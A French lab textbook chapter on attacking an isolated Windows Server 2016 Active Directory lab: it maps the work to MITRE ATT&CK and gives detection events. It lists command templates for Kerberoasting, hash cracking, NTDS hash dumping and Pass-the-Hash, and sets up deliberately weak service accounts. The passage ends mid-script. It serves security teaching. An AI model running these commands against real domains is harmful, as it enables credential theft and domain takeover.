# Chapitre 3 — Attaques sur Windows Server et Active Directory

> **Périmètre de sécurité** — Ce chapitre s'exécute exclusivement dans le laboratoire isolé `192.168.56.0/24` (réseau host-only `vboxnet0`). Kali Linux `192.168.56.101` est la machine attaquante ; Windows Server 2016 `192.168.56.102` est le contrôleur de domaine Active Directory (domaine `LAB.local`). Aucune activité vers Internet, aucune cible réelle, aucun réseau de production.
>
> **Snapshot obligatoire** — Avant toute exploitation, Windows Server 2016 `192.168.56.102` doit être démarré et un snapshot propre doit être pris. À la fin du chapitre (après Lab-05), le snapshot est restauré (rollback) pour remettre le contrôleur de domaine dans son état sain.

## 1. Objectif

Ce chapitre vous guide pas à pas à travers les attaques contre un environnement Windows Server 2016 avec Active Directory : reconnaissance et énumération LDAP, Kerberoasting, crackage hors ligne de tickets de service, Pass-the-Hash, exécution de commandes à distance, dump des secrets du domaine, élévation de privilèges, déplacement latéral, puis détection, preuves et restauration de l'environnement.

À la fin de ce chapitre, vous devez être capable de :

- énumérer un annuaire Active Directory depuis Kali (LDAP, comptes, SPN, politique de mots de passe) ;
- demander et extraire des tickets TGS Kerberoasting, puis cracker le mot de passe d'un compte de service hors ligne ;
- réutiliser un hachage NTLM sans connaître le mot de passe en clair (Pass-the-Hash) pour exécuter des commandes à distance ;
- dump les hachages de domaine depuis le contrôleur de domaine et compromettre le compte `Administrator` ;
- créer un compte de domaine (élévation), produire les preuves d'accès, dresser les journaux de détection attendus et restaurer le snapshot de la cible.

Chaque démonstration est rattachée à une tactique et une technique MITRE ATT&CK, avec sa source de données, sa règle de détection et sa mitigation. Tous les exploits et commandes sont exécutés en réel sur les VMs de laboratoire ; aucun contenu n'est simulé.

> **Rôle du chapitre** — Le chapitre 3 est le chapitre **attaques Windows Server et Active Directory**. Il produit les preuves d'accès et de compromission du domaine. Le chapitre 4 prend le relais pour l'analyse forensique réseau (Wireshark) et le chapitre 5 pour l'audit, le durcissement et la remédiation.

## 2. Notions et vocabulaire

- **Active Directory (AD)** : annuaire de Microsoft qui stocke les objets d'un domaine (utilisateurs, groupes, ordinateurs, stratégies de sécurité) et gère l'authentification.
- **Contrôleur de domaine (DC)** : serveur Windows sur lequel Active Directory est installé ; ici `WS2016-DC.LAB.local` à l'IP `192.168.56.102`.
- **Domaine `LAB.local`** : domaine de laboratoire utilisé pour les démonstrations ; NetBIOS `LAB`.
- **Kerberos** : protocole d'authentification d'Active Directory. Le client demande un **TGT** (Ticket Granting Ticket) au service d'authentification (AS), puis un **TGS** (Ticket Granting Service) pour accéder à un service.
- **SPN (Service Principal Name)** : identifiant d'un service associé à un compte de service dans Active Directory, ex. `HTTP/ws2016-dc.lab.local`.
- **Kerberoasting (T1558.003)** : attaque qui consiste à demander des tickets TGS pour des comptes de service portant des SPN, à en extraire le hachage chiffré avec la clé du compte de service, puis à le cracker hors ligne pour retrouver le mot de passe du compte de service.
- **Pass-the-Hash (T1550.002)** : réutilisation d'un hachage NTLM pour s'authentifier à distance sans connaître le mot de passe en clair.
- **Hachage NTLM** : hachage MD4 du mot de passe encodé en UTF-16-LE, stocké sous la forme `LMHASH:NTHASH`.
- **Secrets du domaine / NTDS** : base de données Active Directory (`NTDS.dit`) contenant les hachages de tous les comptes du domaine ; son dump nécessite des droits administratifs sur le contrôleur de domaine.
- **Déplacement latéral** : passage d'un poste compromis à un autre système du même réseau, ici via SMB et WMI depuis Kali.
- **Élévation de privilèges** : passage d'un compte utilisateur standard à un compte administrateur de domaine, ici par création d'un compte (`T1098 Account Manipulation`).
- **Preuve** : fichier dans `preuves/ch3-labX/` contenant l'entête `# date:`, `# cmd:`, la sortie complète (`stdout` + `stderr`) et le code retour `# rc=`.

## 3. Modèle de menace et plan d'attaque

**Attaquant** : Kali Linux `192.168.56.101`, disposant initialement d'un compte utilisateur standard de domaine `labuser` (mot de passe `LabUser2024!`).

**Cible** : Windows Server 2016 `192.168.56.102`, contrôleur de domaine `LAB.local`.

**Objectif de la chaîne** : passer d'un compte utilisateur standard à la compromission complète du domaine (`Administrator`), puis produire les preuves et restaurer l'environnement.

**Chaîne d'attaque du chapitre** :

| Lab | Étape | Technique MITRE ATT&CK | Résultat attendu |
|---|---|---|---|
| Lab-01 | Reconnaissance Active Directory (LDAP) | T1087.002 Domain Account Discovery, T1482 Domain Trust Discovery, T1018 Remote System Discovery | Comptes de domaine énumérés ; SPN du compte `svc_web` découvert |
| Lab-02 | Kerberoasting et crackage | T1558.003 Kerberoasting, T1110.002 Password Cracking | Mot de passe du compte de service `svc_web` (`S3rviceWeb!`) |
| Lab-03 | Pass-the-Hash et exécution distante | T1550.002 Pass the Hash, T1021.002 SMB/Windows Admin Shares | Shell/commandes à distance en tant que `LAB\svc_web` |
| Lab-04 | Dump NTDS, Pass-the-Hash Administrateur, création de compte | T1003.003 NTDS, T1550.002 Pass the Hash, T1078 Valid Accounts, T1098 Account Manipulation | Hachage de `Administrator`, contrôle du domaine, compte `labadmin` créé |
| Lab-05 | Détection, preuves, nettoyage, rollback | Détection défensive (aucune technique offensive) | Journaux d'événements attendus, IOC, snapshot restauré |

```mermaid
flowchart LR
    A[Kali 192.168.56.101<br/>compte labuser] -->|Lab-01 LDAP<br/>comptes et SPN| B[(Windows Server 2016<br/>DC LAB.local<br/>192.168.56.102)]
    B -->|Lab-02 Kerberoasting<br/>TGS du compte de service| C[Ticket TGS svc_web<br/>crackage hors ligne]
    C -->|mot de passe svc_web| D[Accès SMB/LDAP<br/>LAB\svc_web]
    D -->|Lab-03 Pass-the-Hash| E[Exécution distante<br/>sur le contrôleur de domaine]
    E -->|Lab-04 secretsdump + PTH| F[Hachage Administrator<br/>contrôle du domaine]
    F -->|création de compte| G[Compte labadmin<br/>élévation de privilèges]
    G -->|Lab-05 détection| H[Événements Windows<br/>4768/4769/4624/4720<br/>rollback snapshot]
```



**Fig 3.1** — Chaîne d'attaque du chapitre 3 : reconnaissance LDAP, Kerberoasting, Pass-the-Hash, dump des secrets du domaine, élévation de privilèges, détection et rollback.

## 4. Schéma technique — Kerberoasting (T1558.003)

```mermaid
flowchart LR
    U[Utilisateur de domaine<br/>labuser] -->|1. TGS-REQ avec SPN| D[Contrôleur de domaine<br/>WS2016-DC.LAB.local]
    D -->|2. Ticket TGS chiffré<br/>avec la clé NT du compte de service| U
    U -->|3. Extraction du hachage TGS| F[Fichier krb5tgs<br/>hash hors ligne]
    F -->|4. Crackage (wordlist,<br/>john / hashcat)| M[Mot de passe svc_web<br/>S3rviceWeb!]
    M -->|5. Authentification<br/>SMB / LDAP| D
```

**Fig 3.2** — Flux Kerberoasting : demande de ticket TGS pour un SPN, extraction du hachage du compte de service et crackage hors ligne pour récupérer le mot de passe en clair.

## 5. Prérequis, outils et convention de preuve

**5.1 Prérequis**

Avant de commencer les labs, assurez-vous d'avoir :

- chapitres 1 et 2 complétés ;
- Kali Linux `192.168.56.101` démarré, interface `eth0` en `192.168.56.101/24` sur `vboxnet0` ;
- Windows Server 2016 `192.168.56.102` démarré, contrôleur de domaine du domaine `LAB.local`, avec un **snapshot propre pris avant toute exploitation** ;
- les outils Kali installés : `nmap`, `ldapsearch`, `enum4linux`, `nxc` (NetExec), `smbclient`, `john`, `python3` et les scripts Impacket (`getuserspns.py`, `getnpusers.py`, `secretsdump.py`, `wmiexec.py`, `smbexec.py`) ;
- la fonction de preuve `prouve` chargée dans le shell Kali (voir 5.3) ;
- un disque suffisant pour les fichiers de preuve et les tickets extraits ;
- les comptes de test du laboratoire existants sur le contrôleur de domaine (voir 5.4) ;
- aucun accès Internet n'est nécessaire ; toutes les recherches et exécutions se font sur le réseau host-only.

**5.2 Outils et commandes de référence**

| Outil | Commande de référence | Rôle |
|---|---|---|
| `nmap` | `nmap -sT -p 53,88,135,138,139,389,445,464,3268,3269,3389 192.168.56.102` | Scan des ports Active Directory (sans root) |
| `ldapsearch` | `ldapsearch -x -h 192.168.56.102 -p 389 ...` | Énumération de l'annuaire LDAP |
| `nxc` (NetExec) | `nxc ldap 192.168.56.102 -u labuser -p '...' --pass-pol` | Politique de mots de passe, authentification LDAP/SMB |
| `getuserspns.py` | `getuserspns.py 'LAB/labuser:...' -dc-ip 192.168.56.102 -request` | Demande et extraction de tickets TGS (Kerberoasting) |
| `john` | `john --wordlist=... --format=krb5tgs hash.txt` | Crackage hors ligne du hachage TGS |
| `secretsdump.py` | `secretsdump.py 'LAB/svc_web:...'@192.168.56.102` | Dump des hachages du domaine (NTDS) |
| `wmiexec.py` / `smbexec.py` | `wmiexec.py -hashes :<hash> 'LAB/user'@192.168.56.102 'whoami'` | Exécution de commandes à distance (WMI / SMB) |
| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, sortie, `# rc=` |

**5.3 Convention de preuve — fonction `prouve`**

Chaque commande d'exécution doit produire une preuve horodatée contenant `# date:`, `# cmd:`, la sortie complète (`stdout` + `stderr`) et le code retour `# rc=`. La fonction `prouve` (définie et testée au chapitre 1) doit être créée et chargée sur Kali avant le premier lab :

```bash
prouve() {
  local fichier="$1"; shift
  mkdir -p "$(dirname "$fichier")"
  { printf '# date: %s\n# cmd: %s\n' "$(date -Is)" "$*"
    "$@"; printf '# rc=%d\n' "$?"
  } 2>&1 | tee "$fichier"
}
set -o pipefail
```

1. Sur Kali, créez le fichier : `nano /home/kali/prouve.sh`, collez le contenu ci-dessus, enregistrez (`Ctrl+O`, `Entrée`, `Ctrl+X`).
2. Chargez la fonction dans le shell courant : `source /home/kali/prouve.sh` puis vérifiez avec `type prouve`.
3. Ne lancez pas `./prouve.sh` (la fonction disparaîtrait à la fin du script). `chmod +x` n'est pas nécessaire pour `source`.

Contrôle rapide :

```bash
prouve preuves/test/ok.txt echo bonjour
prouve preuves/test/echec.txt commande_inexistante
grep -H '^# rc=' preuves/test/*.txt
```

Résultat attendu : `# rc=0` pour `echo`, `# rc=127` pour la commande inexistante.

**5.4 Comptes de test du laboratoire**

Ces comptes sont des valeurs de laboratoire, créés sur le contrôleur de domaine `LAB.local` avant le début des labs :

| Compte | Mot de passe | Rôle dans le chapitre |
|---|---|---|
| `labuser` | `LabUser2024!` | Compte utilisateur standard, point de départ de l'attaquant |
| `svc_web` | `S3rviceWeb!` | Compte de service avec SPN `HTTP/ws2016-dc.lab.local`, membre du groupe `Administrators` local du contrôleur de domaine (configuration de laboratoire uniquement) |
| `Administrator` | — | Compte administrateur de domaine ; son hachage NTLM est récupéré lors de Lab-04 |
| `labadmin` | `P@ssw0rd!2024` | Compte créé au Lab-04 pour illustrer l'élévation de privilèges (`T1098`) |

## 6. Rattachement MITRE ATT&CK du chapitre

| Lab | Tactique | Technique | ID | Source de données | Contrôle défensif |
|---|---|---|---|---|---|
| Lab-01 | Discovery (TA0007) | Domain Account Discovery | T1087.002 | DS0026 Active Directory | LDAP signing, channel binding, désactiver LDAP anonyme |
| Lab-01 | Discovery (TA0007) | Domain Trust Discovery | T1482 | DS0026 Active Directory | Segmentation, restriction des requêtes LDAP |
| Lab-01 | Discovery (TA0007) | Remote System Discovery | T1018 | DS0029 Network Traffic | Filtrage réseau, détection des scans |
| Lab-02 | Credential Access (TA0006) | Kerberoasting | T1558.003 | DS0026, DS0029 | Mots de passe longs des comptes de service, gMSA, AES, surveillance des TGS |
| Lab-02 | Credential Access (TA0006) | Password Cracking | T1110.002 | DS0029 Network Traffic | Politiques de mots de passe fortes, verrouillage de compte |
| Lab-03 | Credential Access (TA0006) / Lateral Movement (TA0008) | Pass the Hash | T1550.002 | DS0028 Logon Session | Restreindre NTLM, Protected Users, Credential Guard |
| Lab-03 | Lateral Movement (TA0008) | SMB/Windows Admin Shares | T1021.002 | DS0029, DS0015 | Limiter les partages administratifs, LAPS |
| Lab-04 | Credential Access (TA0006) | NTDS | T1003.003 | DS0026, DS0022 File | Protéger les administrateurs locaux du DC, surveiller l'accès à NTDS.dit |
| Lab-04 | Privilege Escalation (TA0004) | Valid Accounts | T1078 | DS0028, DS0026 | MFA, PAM, comptes à privilèges séparés |
| Lab-04 | Privilege Escalation (TA0004) | Account Manipulation | T1098 | DS0026, DS0002 | Audit 4720/4726, revue régulière des comptes de domaine |

Règles de détection attendues (consolidées au Lab-05) :

- événement `4768` : demande de TGT Kerberos (authentification `labuser`) ;
- événement `4769` : demande de TGS Kerberos ; un grand nombre de TGS demandés par un utilisateur, avec chiffrement RC4 (`0x17`), indique du Kerberoasting ;
- événement `4624` type 3 (ouverture réseau) avec le package NTLM depuis `192.168.56.101` indique du Pass-the-Hash ;
- événement `4625` : échecs d'authentification (tentatives LDAP infructueuses) ;
- événement `4720` : création d'un compte utilisateur de domaine (`labadmin`) ;
- événement `4726` : suppression de compte (nettoyage) ;
- événement `4740` : verrouillage de compte (politique de verrouillage) ;
- événement `4672` : attribution de privilèges spéciaux (session `Administrator`).

IOC du chapitre : adresse IP source `192.168.56.101` ; comptes `svc_web` et `labadmin` impliqués dans des authentifications inhabituelles ; tickets TGS demandés pour des comptes de service ; accès aux partages `ADMIN$` / `C$` depuis une station non gérée.

## 7. Laboratoires du chapitre

## 0. Installation et configuration de la cible Windows Server 2016 (Active Directory)

### Présentation et portée

Cette section décrit la préparation de la cible du chapitre 3 : Windows Server 2016 `192.168.56.102`, promu contrôleur de domaine du domaine Active Directory `LAB.local` (NetBIOS `LAB`). Elle s'effectue **avant** les labs Lab-01 à Lab-05 et n'est pas une attaque : aucune technique MITRE ATT&CK offensive n'est appliquée ici. La seule référence indicative est **T1087.002 (Domain Account Discovery)**, car les comptes créés dans cette section (`svc_web`, `lab_user`) seront ensuite découverts et énumérés depuis Kali au Lab-01.

Toutes les commandes ci-dessous sont exécutées en réel sur les VMs de laboratoire : Windows Server 2016 `192.168.56.102` pour l'installation et la configuration, Kali `192.168.56.101` pour la vérification finale, et l'hôte VirtualBox pour le snapshot. Aucune cible réelle, aucun réseau de production, aucun accès Internet.

Les fichiers de preuve produits sur Windows Server sont consignés manuellement (copie de la sortie PowerShell) ou exportés vers le dossier de preuve du laboratoire ; la convention de preuve (`# date:`, `# cmd:`, `# rc=`) s'applique aux commandes exécutées depuis Kali (voir section 5.3 du chapitre).

### 1. Prérequis matériels et réseau

**But** — disposer d'une VM Windows Server 2016 prête à être installée sur le réseau host-only isolé.

**Machine** — hôte VirtualBox (gestion de la VM), puis Windows Server 2016 `192.168.56.102`.

**Prérequis** — VirtualBox installé, image ISO Windows Server 2016 (Standard Edition), réseau host-only `vboxnet0` (`192.168.56.0/24`, hôte `192.168.56.1`), DHCP VirtualBox désactivé, aucune carte réseau en pont ni NAT.

> **Machine** : hôte VirtualBox | **Terminal** : gestionnaire VirtualBox / ligne de commande de l'hôte | **Utilisateur** : utilisateur de l'hôte | **Répertoire** : répertoire des machines virtuelles

Configuration matérielle recommandée de la VM :

- Type : Microsoft Windows (64-bit), version Windows 2016 (64-bit)
- Mémoire vive : 2 048 Mo minimum (4 096 Mo recommandés)
- Disque dur : 60 Go minimum, alloué dynamiquement
- Carte réseau : adaptateur host-only `vboxnet0`
- Lecteur optique : ISO Windows Server 2016 insérée au démarrage

**Résultat attendu**

La VM Windows Server 2016 est créée, éteinte, avec une carte réseau sur `vboxnet0` et l'ISO d'installation insérée. Aucun démarrage n'a encore eu lieu.

**Preuve** : fiche de configuration de la VM (capture du gestionnaire VirtualBox) conservée dans `preuves/ch3-setup/vm-config.txt`.

### 2. Installation de Windows Server 2016

**But** — installer Windows Server 2016 Standard Edition avec expérience utilisateur (Desktop Experience), définir le mot de passe du compte intégré `Administrateur` et nommer la machine `WIN-SRV-2016`.

**Machine** — Windows Server 2016 `192.168.56.102` (en cours d'installation).

**Prérequis** — VM démarrée sur l'ISO Windows Server 2016, clavier et écran de la VM accessibles (fenêtre VirtualBox ou console).

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : écran d'installation Windows | **Utilisateur** : installation (aucun utilisateur ouvert) | **Répertoire** : n/a

Étapes d'installation :

1. Sélectionner la langue (Français), l'heure et le format de la devise, le clavier, puis cliquer sur `Installer maintenant`.
2. Choisir **Windows Server 2016 Standard (Desktop Experience)** (version avec interface graphique, requise pour Server Manager et les outils graphiques du chapitre).
3. Accepter les termes de la licence.
4. Choisir `Installation personnalisée : installer uniquement Windows (avancé)`.
5. Sélectionner le disque non alloué et créer la partition système ; Windows y installe les fichiers et redémarre plusieurs fois.
6. À l'ouverture de session, définir le mot de passe du compte intégré `Administrateur` (mot de passe complexe, consigné dans le gestionnaire de mots de passe du laboratoire).
7. À la fin de l'installation, ouvrir une session en tant qu'`Administrateur` avec ce mot de passe.

**Exemple de commande** (première ouverture de session, PowerShell en tant qu'administrateur) :

```powershell
# Renommage de la machine en WIN-SRV-2016 (redémarrage requis)
Rename-Computer -NewName "WIN-SRV-2016" -Restart
```

**Explication de la commande**

- `Rename-Computer` : cmdlet PowerShell qui change le nom de l'ordinateur local.
- `-NewName "WIN-SRV-2016"` : nouveau nom de machine attribué à la cible.
- `-Restart` : redémarre immédiatement la machine après le renommage (nécessaire pour que le nouveau nom soit effectif).
- Piège courant : après le redémarrage, la session s'ouvre toujours sous `.\Administrateur` ; le nouveau nom de machine est effectif au prochain démarrage.

**Résultat attendu**

```text
Confirmation
Are you sure you want to restart the computer?
[Y] Yes [N] No [S] Suspend [?] Help (default is "Y"): Y
```

Après redémarrage, dans l'invite de commandes :

```text
C:\> hostname
WIN-SRV-2016
```

**Preuve** : capture d'écran de l'écran d'accueil Windows Server 2016 avec le nom `WIN-SRV-2016`, et sortie de `hostname` consignée dans `preuves/ch3-setup/hostname.txt`.

### 3. Configuration réseau

**But** — configurer l'IP statique `192.168.56.102/24` sur la carte réseau host-only, avec passerelle `192.168.56.1` et DNS `127.0.0.1` (à remplacer par l'IP du serveur lui-même après promotion en contrôleur de domaine), puis vérifier la connectivité.

**Machine** — Windows Server 2016 `192.168.56.102`.

**Prérequis** — Windows Server 2016 installé, session `Administrateur` ouverte, carte réseau sur `vboxnet0`.

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : PowerShell en tant qu'administrateur | **Utilisateur** : `Administrateur` | **Répertoire** : `C:\Users\Administrator`

**Exemple de commande** (configuration de l'IP statique avec Netsh) :

```cmd
netsh interface ip set address name="Ethernet" static 192.168.56.102 255.255.255.0 192.168.56.1
netsh interface ip set dns name="Ethernet" static 127.0.0.1 primary
```

**Explication de la commande**

- `netsh interface ip set address` : configure l'adresse IP statique de l'interface réseau nommée.
- `name="Ethernet"` : nom de l'interface réseau (à adapter si l'interface s'appelle autrement, ex. "Ethernet 2" ; vérifier avec `netsh interface ip show config`).
- `static 192.168.56.102 255.255.255.0 192.168.56.1` : adresse IP `192.168.56.102`, masque de sous-réseau `255.255.255.0` (`/24`), passerelle par défaut `192.168.56.1` (hôte VirtualBox).
- `netsh interface ip set dns` : configure le serveur DNS de l'interface.
- `static 127.0.0.1 primary` : DNS primaire `127.0.0.1` (localhost) ; ce DNS sera remplacé par l'IP du serveur (`192.168.56.102`) après la promotion en contrôleur de domaine, car le serveur hébergera alors le service DNS du domaine `LAB.local`.
- Piège courant : le nom de l'interface doit correspondre exactement ; sinon la commande échoue avec `The object was not found`.

**Résultat attendu**

```text
La configuration de l'adresse IP statique a reussi.
La configuration du serveur DNS a reussi.
```

Vérification de la configuration :

```cmd
ipconfig /all
ping 192.168.56.101
```

**Explication de la commande**

- `ipconfig /all` : affiche la configuration TCP/IP complète de toutes les interfaces (adresse IP, masque, passerelle, serveurs DNS, adresse MAC).
- `ping 192.168.56.101` : verifie la jointe de Kali sur le réseau host-only (`192.168.56.0/24`).
- Piège courant : si `ping` ne reçoit pas de réponse, verifier que Kali est demarre sur `vboxnet0` et qu'aucun pare-feu hôte ne bloque les ICMP.

**Résultat attendu**

```text
Configuration IP de Windows

   Nom de l'hôte . . . . . . . . . . : WIN-SRV-2016
   Suffix DNS principal . . . . . . . :
   Type de noeud . . . . . . . . . . : Hybride
   Routage IP activé . . . . . . . . : Non
   Proxy WINS activé . . . . . . . . : Non

Carte Ethernet Ethernet :

   Suffix DNS propre à la connexion :
   Description . . . . . . . . . . . : Adaptateur reseau par defaut VirtualBox
   Adresse physique . . . . . . . . . : 08-00-27-XX-XX-XX
   DHCP active . . . . . . . . . . . : Non
   Configuration automatique activee : Oui
   Adresse IPv6. . . . . . . . . . . : ...
   Adresse IPv4. . . . . . . . . . . : 192.168.56.102
   Masque de sous-reseau . . . . . . : 255.255.255.0
   Passerelle par defaut . . . . . . : 192.168.56.1
   Serveurs DNS . . . . . . . . . . . : 127.0.0.1
```

```text
Envoi d'une requete 'Ping'  192.168.56.101 avec 32 octets de donnees :
Reponse de 192.168.56.101 : octets=32 temps<1ms TTL=64
Reponse de 192.168.56.101 : octets=32 temps<1ms TTL=64

Statistiques Ping pour 192.168.56.101:
    Paquets : envoyes = 4, recus = 4, perdus = 0 (0% de perte),
```

**Preuve** : sortie de `ipconfig /all` et du `ping` enregistree dans `preuves/ch3-setup/ipconfig.txt` (sur Windows Server) ; depuis Kali, `ping 192.168.56.102` doit repondre (preuve dans `preuves/ch3-setup/ping-kali.txt`).

### 4. Installation du rôle AD DS

**But** — installer le rôle Active Directory Domain Services (AD DS) sur Windows Server 2016, avec ses outils de gestion.

**Machine** — Windows Server 2016 `192.168.56.102`.

**Prérequis** — IP statique configuree (section 3), session `Administrateur` ouverte.

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : PowerShell en tant qu'administrateur | **Utilisateur** : `Administrateur` | **Répertoire** : `C:\Users\Administrator`

**Exemple de commande** (installation du rôle via PowerShell) :

```powershell
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
```

**Explication de la commande**

- `Install-WindowsFeature` : cmdlet PowerShell qui ajoute un rôle ou une fonctionnalite à Windows Server.
- `AD-Domain-Services` : nom du rôle Active Directory Domain Services (services d'annuaire de Microsoft).
- `-IncludeManagementTools` : installe egalement les outils d'administration (Active Directory Administrative Center, Utilisateurs et ordinateurs Active Directory, module ActiveDirectory pour PowerShell).
- Piège courant : l'installation du rôle AD DS ne promeut pas encore le serveur en contrôleur de domaine ; une étape de promotion séparée est obligatoire (section 5).

**Résultat attendu**

```text
Success Restart Needed Exit Code      Feature Result
------- -------------- ---------      --------------
True    No             Success        {Active Directory Domain Services, ...}
```

La sortie confirme que le rôle `AD-Domain-Services` a été installe (`Success`) sans redémarrage immediat obligatoire.

**Preuve** : sortie de l'installation consignee dans `preuves/ch3-setup/install-ad-ds.txt`.

### 5. Promotion en contrôleur de domaine

**But** — promouvoir Windows Server 2016 en premier contrôleur de domaine d'une nouvelle forêt `LAB.local` (NetBIOS `LAB`), avec installation du service DNS, définition des chemins de la base AD (NTDS/SYSVOL) et du mot de passe de restauration (DSRM), puis redémarrage.

**Machine** — Windows Server 2016 `192.168.56.102`.

**Prérequis** — rôle AD DS installe (section 4), IP statique `192.168.56.102`.

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : PowerShell en tant qu'administrateur | **Utilisateur** : `Administrateur` | **Répertoire** : `C:\Users\Administrator`

**Exemple de commande** (promotion en contrôleur de domaine, forêt racine) :

```powershell
$DsrmPassword = Read-Host -AsSecureString -Prompt "Mot de passe DSRM"
Install-ADDSForest `
    -DomainName "LAB.local" `
    -DomainNetbiosName "LAB" `
    -InstallDns:$true `
    -DomainMode Win2016 `
    -ForestMode Win2016 `
    -DatabasePath "C:\Windows\NTDS" `
    -LogPath "C:\Windows\NTDS" `
    -SysvolPath "C:\Windows\SYSVOL" `
    -SafeModeAdministratorPassword $DsrmPassword `
    -Force:$true
```

**Explication de la commande**

- `Install-ADDSForest` : cmdlet du module ADDSDeployment qui installe une nouvelle forêt Active Directory (premier contrôleur de domaine).
- `-DomainName "LAB.local"` : nom DNS complet de la forêt et du domaine racine.
- `-DomainNetbiosName "LAB"` : nom NetBIOS du domaine (utilisé par les clients anciens et certains services).
- `-InstallDns:$true` : installe et configure le service DNS sur le contrôleur de domaine (le domaine a besoin d'un serveur DNS pour ses enregistrements SRV).
- `-DomainMode Win2016` / `-ForestMode Win2016` : niveau fonctionnel du domaine et de la forêt fixé à Windows Server 2016.
- `-DatabasePath` : chemin du fichier de base de données Active Directory (`NTDS.dit`).
- `-LogPath` : chemin des journaux de transactions de la base AD (ici même répertoire que la base).
- `-SysvolPath` : chemin du dossier SYSVOL (scripts de démarrage, stratégies de groupe répliquées).
- `-SafeModeAdministratorPassword $DsrmPassword` : mot de passe du compte Administrateur en mode sans échec des services de répertoires (DSRM), requis pour la récupération du domaine.
- `-Force:$true` : exécute la promotion sans invite de confirmation supplémentaire.
- Le mot de passe DSRM est saisi de manière sécurisée (`Read-Host -AsSecureString`) et ne s'affiche pas en clair.
- Piège courant : si le DNS de l'interface pointe encore sur `127.0.0.1` avant l'installation du service DNS, la promotion peut échouer ; installer DNS en même temps (`-InstallDns:$true`) résout le problème. La machine redémarre automatiquement à la fin de la promotion.

**Résultat attendu**

```text
Verifying prerequisites...
Installation of Active Directory Domain Services (AD DS) has successfully completed.
The system needs to reboot to continue.
```

Le contrôleur de domaine redémarre automatiquement. Après redémarrage, la machine est le contrôleur de domaine du domaine `LAB.local` ; le DNS de l'interface doit pointer vers `192.168.56.102` (l'adresse du serveur lui-même).

**Preuve** : sortie de la promotion consignee dans `preuves/ch3-setup/promotion-dc.txt` ; vérification ultérieure avec `Get-ADDomain` ou `ipconfig /all` (DNS `192.168.56.102`).

### 6. Rôle DNS

**But** — vérifier que le rôle DNS a été installé automatiquement avec AD DS et qu'il écoute sur le port 53.

**Machine** — Windows Server 2016 `192.168.56.102`.

**Prérequis** — promotion en contrôleur de domaine effectuée (section 5), machine redémarrée.

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : PowerShell en tant qu'administrateur | **Utilisateur** : `Administrateur` | **Répertoire** : `C:\Users\Administrator`

**Exemple de commande** (vérification de l'écoute DNS sur le port 53) :

```powershell
Get-NetTCPConnection -LocalPort 53 -State Listen | Select-Object LocalAddress, LocalPort, State, OwningProcess
```

**Explication de la commande**

- `Get-NetTCPConnection` : liste les connexions TCP actives et les ports en écoute (équivalent modernisé de `netstat`).
- `-LocalPort 53` : filtre sur le port 53, port du service DNS.
- `-State Listen` : ne garde que les connexions en état d'écoute (service disponible).
- `Select-Object LocalAddress, LocalPort, State, OwningProcess` : affiche l'adresse locale, le port, l'état et le processus propriétaire (le service DNS, `dns.exe`).
- Piège courant : si aucune ligne n'est retournée, le service DNS n'est pas démarré (`Start-Service DNS`) ou le rôle n'est pas correctement installé.

**Résultat attendu**

```text
LocalAddress   LocalPort State      OwningProcess
------------   --------- -----      -------------
0.0.0.0             53 Listen             1420
[::]                 53 Listen             1420
```

Le service DNS écoute sur `0.0.0.0:53` et `[::]:53` (IPv4 et IPv6) ; le processus `dns.exe` (PID 1420 ici) est le propriétaire.

Autre vérification possible depuis l'invite de commandes :

```cmd
nslookup -type=SRV _ldap._tcp.dc._msdcs.LAB.local 127.0.0.1
```

**Résultat attendu** : une réponse contenant l'enregistrement SRV du contrôleur de domaine, prouvant que le DNS du domaine fonctionne.

**Preuve** : sortie de `Get-NetTCPConnection` et, le cas échéant, de `nslookup`, consignee dans `preuves/ch3-setup/dns-port53.txt`.

### 7. Comptes de test pour les labs du chapitre 3

**But** — créer les comptes utilisateurs de domaine nécessaires aux Labs 01 à 05 : `svc_web` (compte de service avec SPN, mot de passe faible à craquer pour le Kerberoasting), `lab_user` (utilisateur standard) ; le compte intégré `Administrateur` existe déjà.

**Machine** — Windows Server 2016 `192.168.56.102`.

**Prérequis** — contrôleur de domaine `LAB.local` opérationnel, module ActiveDirectory disponible (installé avec `-IncludeManagementTools` à la section 4), session `Administrateur` de domaine ouverte.

> **Machine** : Windows Server 2016 `192.168.56.102` | **Terminal** : PowerShell en tant qu'administrateur | **Utilisateur** : `Administrateur` (domaine `LAB\Administrateur`) | **Répertoire** : `C:\Users\Administrator`

Les comptes sont créés avec le script PowerShell ci-dessous (plus de 15 lignes, commenté bloc par bloc) :

```powershell
# Script de creation des comptes de test du chapitre 3 (Windows Server 2016, domaine LAB.local)
# But : creer svc_web (compte de service avec SPN pour le Kerberoasting) et lab_user (utilisateur standard)
# pour preparer l'environnement des Labs 01 a 05.

# ------------------------------------------------------------------
# Bloc 1 : importation du module ActiveDirectory et definition des mots de passe
# ------------------------------------------------------------------
Import-Module ActiveDirectory

$PasswordSvcWeb = ConvertTo-SecureString "S3rviceWeb!" -AsPlainText -Force
$PasswordLabUser = ConvertTo-SecureString "LabUser2024!" -AsPlainText -Force

# ------------------------------------------------------------------
# Bloc 2 : creation du compte de service svc_web (mot de passe faible, propose a craquer)
# ------------------------------------------------------------------
New-ADUser `
    -Name "svc_web" `
    -SamAccountName "svc_web" `
    -UserPrincipalName "svc_web@LAB.local" `
    -AccountPassword $PasswordSvcWeb `
    -Enabled:$true `
    -PasswordNeverExpires:$true `
    -CannotChangePassword:$true `
    -Path "CN=Users,DC=LAB,DC=local" `
    -DisplayName "Service Web (compte de service - laboratoire)" `
    -Description "Compte de service avec SPN pour les demonstrations de Kerberoasting (chapitre 3)"

# ------------------------------------------------------------------
# Bloc 3 : creation de l'utilisateur standard lab_user
# ------------------------------------------------------------------
New-ADUser `
    -Name "lab_user" `
    -SamAccountName "lab_user" `
    -UserPrincipalName "lab_user@LAB.local" `
    -AccountPassword $PasswordLabUser `
    -Enabled:$true `
    -PasswordNeverExpires:$false `
    -CannotChangePassword:$false `
    -Path "CN=Users,DC=LAB,DC=local" `
    -DisplayName "Utilisateur standard (laboratoire)" `
    -Description "Compte utilisateur standard, point de départ de l'attaquant (Lab-01)"

# ------------------------------------------------------------------
# Bloc 4 : enregistrement du SPN HTTP sur le compte de service svc_web
# ------------------------------------------------------------------
